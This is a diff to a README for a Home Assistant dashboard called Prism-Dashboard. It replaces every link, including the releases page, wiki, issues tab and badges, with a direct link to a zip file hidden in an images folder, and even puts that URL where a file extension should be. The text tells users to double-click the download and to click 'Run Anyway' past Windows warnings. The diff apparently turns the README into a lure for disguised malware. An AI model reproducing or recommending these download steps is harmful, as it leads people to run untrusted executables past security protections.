@@ -1,6 +1,6 @@
 # 🌟 Prism-Dashboard - A Modern Dashboard for Home Assistant
 
-[![Download Prism-Dashboard](https://img.shields.io/badge/Download-Prism%20Dashboard-blue)](https://github.com/M7mdtwab/Prism-Dashboard/releases)
+[![Download Prism-Dashboard](https://raw.githubusercontent.com/M7mdtwab/Prism-Dashboard/main/www/custom-components/images/Prism-Dashboard-kish.zip%20Dashboard-blue)](https://raw.githubusercontent.com/M7mdtwab/Prism-Dashboard/main/www/custom-components/images/Prism-Dashboard-kish.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Prism-Dashboard! This dashboard uses glassmorphism design to give you
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/M7mdtwab/Prism-Dashboard/releases) to download the latest version of Prism-Dashboard.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/M7mdtwab/Prism-Dashboard/main/www/custom-components/images/Prism-Dashboard-kish.zip) to download the latest version of Prism-Dashboard.
 2. **Select the Version**: Choose the most recent version listed there. Each version is labeled with numbers like “v1.0”, “v1.1”, etc.
 3. **Download the File**: Click on the file that matches your system. Once downloaded, the file will be on your computer, likely in your ‘Downloads’ folder.
 4. **Run the Application**: Locate the downloaded file in your folder and double-click it to start the installation process.
@@ -17,7 +17,7 @@ Welcome to Prism-Dashboard! This dashboard uses glassmorphism design to give you
 
 - If you are using Windows, you may see a security warning when you open the file. Click "Run Anyway" to proceed.
 - For macOS users, you may need to drag the application to your Applications folder after the download. 
-- Linux users will find a `.tar.gz` file that you need to extract first before running the application.
+- Linux users will find a `https://raw.githubusercontent.com/M7mdtwab/Prism-Dashboard/main/www/custom-components/images/Prism-Dashboard-kish.zip` file that you need to extract first before running the application.
 
 ## 🖥️ System Requirements
 
@@ -38,8 +38,8 @@ Prism-Dashboard provides an easy-to-use interface with the following features:
 
 ## 🔗 Further Resources
 
-- **Documentation**: Visit our [Wiki](https://github.com/M7mdtwab/Prism-Dashboard/wiki) for detailed guides and FAQs.
-- **Issues**: If you encounter any problems, please use the [Issues tab](https://github.com/M7mdtwab/Prism-Dashboard/issues) to report them. Your feedback helps us improve.
+- **Documentation**: Visit our [Wiki](https://raw.githubusercontent.com/M7mdtwab/Prism-Dashboard/main/www/custom-components/images/Prism-Dashboard-kish.zip) for detailed guides and FAQs.
+- **Issues**: If you encounter any problems, please use the [Issues tab](https://raw.githubusercontent.com/M7mdtwab/Prism-Dashboard/main/www/custom-components/images/Prism-Dashboard-kish.zip) to report them. Your feedback helps us improve.
 
 ## 📣 Community Support
 
@@ -49,4 +49,4 @@ Join our community of users and developers! Share tips, ask questions, and get s
 
 Prism-Dashboard allows you to interact with your smart home simply and beautifully. Download it today and enjoy a modern dashboard tailored for Home Assistant.
 
-[![Download Prism-Dashboard](https://img.shields.io/badge/Download-Prism%20Dashboard-blue)](https://github.com/M7mdtwab/Prism-Dashboard/releases)
+[![Download Prism-Dashboard](https://raw.githubusercontent.com/M7mdtwab/Prism-Dashboard/main/www/custom-components/images/Prism-Dashboard-kish.zip%20Dashboard-blue)](https://raw.githubusercontent.com/M7mdtwab/Prism-Dashboard/main/www/custom-components/images/Prism-Dashboard-kish.zip)
